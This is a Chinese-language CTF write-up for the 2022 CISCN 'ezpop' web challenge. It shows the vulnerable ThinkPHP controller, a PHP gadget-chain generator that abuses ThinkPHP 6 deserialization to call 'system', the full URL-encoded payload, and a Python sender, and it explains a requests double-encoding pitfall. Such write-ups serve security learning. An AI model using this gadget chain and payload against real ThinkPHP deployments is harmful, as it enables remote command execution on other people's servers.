---
title: 2022 CISCN - ezpop
date: 2024-06-05 15:52:00
tags: [CTF, web]
categories: 题解
---

两年前的意难平
<!--more-->
********************************

## 前言

当时 pop 链都找到了，就是打不通，hackbar 和 python 都不行，成了一个疙瘩，正好现在全面转 web 安全了，把这根刺拔了先。

## 题解

最近渗透做多了，看到题目就想扫目录（
直接访问 `www.zip` 就能把源码下下来，看到 `app/controller/Index.php`

```php
<?php
namespace app\controller;

use app\BaseController;

class Index extends BaseController
{
    public function index()
    {
        return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V' . \think\facade\App::version() . '<br/><span style="font-size:30px;">14载初心不改 - 你值得信赖的PHP框架</span></p><span style="font-size:25px;">[ V6.0 版本由 <a href="https://www.yisu.com/" target="yisu">亿速云</a> 独家赞助发布 ]</span></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="ee9b1aa918103c4fc"></think>';
    }

    public function hello($name = 'ThinkPHP6')
    {
        return 'hello,' . $name;
    }
    public function test()
    {
    unserialize($_POST['a']);
    }
    
}
```

可知路由为 `Index/test`，用 POST 传进参数 `a`，用这个 [PoC](https://www.freebuf.com/vuls/321546.html) 生成一个 payload，然后用 burp 发包，得到 flag。

```php
<?php
namespace think{
    abstract class Model{
        private $lazySave = false;
        private $data = [];
        private $exists = false;
        protected $table;
        private $withAttr = [];
        protected $json = [];
        protected $jsonAssoc = false;
        function __construct($obj = ''){
            $this->lazySave = True;
            $this->data = ['whoami' => ['dir']];
            $this->exists = True;
            $this->table = $obj;
            $this->withAttr = ['whoami' => ['system']];
            $this->json = ['whoami',['whoami']];
            $this->jsonAssoc = True;
        }
    }
}
namespace think\model{
    use think\Model;
    class Pivot extends Model{
    }
}

namespace {
    echo(base64_encode(serialize(new think\model\Pivot(new think\model\Pivot()))));
}
```

payload 如下：

```plain
O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D 
```

把 `dir` 换成 `cat /flag` 即可。

现在分析为什么我当初用 python 不行，这是我的 python 代码：

```python
import requests

url = '<url>/Index/test'

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
data = {
    "a": r"O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D"
}

res = requests.post(url, data=data, headers=headers)

print(res.text)
```

`print(requests.Request('POST', url, data=data, headers=headers).prepare().body)` 查看请求体后发现 payload 长这样了

```plain
a=O%253A17%253A%2522think%255Cmodel%255CPivot%2522%253A7%253A%257Bs%253A21%253A%2522%2500think%255CModel%2500lazySave%2522%253Bb%253A1%253Bs%253A17%253A%2522%2500think%255CModel%2500data%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522dir%2522%253B%257D%257Ds%253A19%253A%2522%2500think%255CModel%2500exists%2522%253Bb%253A1%253Bs%253A8%253A%2522%2500%252A%2500table%2522%253BO%253A17%253A%2522think%255Cmodel%255CPivot%2522%253A7%253A%257Bs%253A21%253A%2522%2500think%255CModel%2500lazySave%2522%253Bb%253A1%253Bs%253A17%253A%2522%2500think%255CModel%2500data%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A3%253A%2522dir%2522%253B%257D%257Ds%253A19%253A%2522%2500think%255CModel%2500exists%2522%253Bb%253A1%253Bs%253A8%253A%2522%2500%252A%2500table%2522%253Bs%253A0%253A%2522%2522%253Bs%253A21%253A%2522%2500think%255CModel%2500withAttr%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522%2500%252A%2500json%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253Bi%253A1%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253B%257D%257Ds%253A12%253A%2522%2500%252A%2500jsonAssoc%2522%253Bb%253A1%253B%257Ds%253A21%253A%2522%2500think%255CModel%2500withAttr%2522%253Ba%253A1%253A%257Bs%253A6%253A%2522whoami%2522%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A7%253A%2522%2500%252A%2500json%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253Bi%253A1%253Ba%253A1%253A%257Bi%253A0%253Bs%253A6%253A%2522whoami%2522%253B%257D%257Ds%253A12%253A%2522%2500%252A%2500jsonAssoc%2522%253Bb%253A1%253B%257D
```

也就是说，它又被 urlencode 了一次，所以应该直接写成如下形式：

```python
data = "a=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D "
```

## 源码分析

跟进 `requests.Request`，可以看到如下代码：

```python
def prepare_body(self, data, files, json=None):
    """Prepares the given HTTP body data."""

    # Check if file, fo, generator, iterator.
    # If not, run through normal process.

    # Nottin' on you.
    body = None
    content_type = None

    if not data and json is not None:
        # urllib3 requires a bytes-like body. Python 2's json.dumps
        # provides this natively, but Python 3 gives a Unicode string.
        content_type = "application/json"

        try:
            body = complexjson.dumps(json, allow_nan=False)
        except ValueError as ve:
            raise InvalidJSONError(ve, request=self)

        if not isinstance(body, bytes):
            body = body.encode("utf-8")

    is_stream = all(
        [
            hasattr(data, "__iter__"),
            not isinstance(data, (basestring, list, tuple, Mapping)),
        ]
    )

    if is_stream:
        try:
            length = super_len(data)
        except (TypeError, AttributeError, UnsupportedOperation):
            length = None

        body = data

        if getattr(body, "tell", None) is not None:
            # Record the current file position before reading.
            # This will allow us to rewind a file in the event
            # of a redirect.
            try:
                self._body_position = body.tell()
            except OSError:
                # This differentiates from None, allowing us to catch
                # a failed `tell()` later when trying to rewind the body
                self._body_position = object()

        if files:
            raise NotImplementedError(
                "Streamed bodies and files are mutually exclusive."
            )

        if length:
            self.headers["Content-Length"] = builtin_str(length)
        else:
            self.headers["Transfer-Encoding"] = "chunked"
    else:
        # Multi-part file uploads.
        if files:
            (body, content_type) = self._encode_files(files, data)
        else:
            if data:
                body = self._encode_params(data)
                if isinstance(data, basestring) or hasattr(data, "read"):
                    content_type = None
                else:
                    content_type = "application/x-www-form-urlencoded"

        self.prepare_content_length(body)

        # Add content-type if it wasn't explicitly provided.
        if content_type and ("content-type" not in self.headers):
            self.headers["Content-Type"] = content_type

    self.body = body
```

可以看到，`data` 参数会被 `self._encode_params` 处理，再看 `self._encode_params`：

```python
@staticmethod
def _encode_params(data):
    """Encode parameters in a piece of data.

    Will successfully encode parameters when passed as a dict or a list of
    2-tuples. Order is retained if data is a list of 2-tuples but arbitrary
    if parameters are supplied as a dict.
    """

    if isinstance(data, (str, bytes)):
        return data
    elif hasattr(data, "read"):
        return data
    elif hasattr(data, "__iter__"):
        result = []
        for k, vs in to_key_val_list(data):
            if isinstance(vs, basestring) or not hasattr(vs, "__iter__"):
                vs = [vs]
            for v in vs:
                if v is not None:
                    result.append(
                        (
                            k.encode("utf-8") if isinstance(k, str) else k,
                            v.encode("utf-8") if isinstance(v, str) else v,
                        )
                    )
        return urlencode(result, doseq=True)
    else:
        return data
```

其中 `@staticmethod` 修饰的方法是静态方法，就是可以直接通过类名调用，不需要实例化。
可以看到，`data` 参数会被 `urlencode` 处理，这就是当年失败的原因。
